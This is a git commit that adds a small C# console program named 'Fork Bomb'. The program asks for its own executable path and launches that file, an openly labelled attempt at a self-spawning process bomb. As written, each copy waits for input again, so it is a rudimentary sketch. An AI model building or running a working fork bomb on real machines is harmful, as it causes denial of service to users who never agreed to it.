47309d600907565514ba91da05b43bb446d0e89a
MatthewNobes <mattnobes.personal@protonmail.com>
2019-06-24 16:13:58 +0100

    Add project files.

---
+++ Fork Bomb/Program.cs
@@ -0,0 +1,19 @@
+﻿using System;
+
+namespace Fork_Bomb
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Fork Bomb V1.0");
+            Console.WriteLine("Fork bomb with a variable start");
+            Console.WriteLine("Enter this programs exe file path ");
+            String filePath = Console.ReadLine();
+
+
+            System.Diagnostics.Process.Start(filePath);
+
+        }
+    }
+}
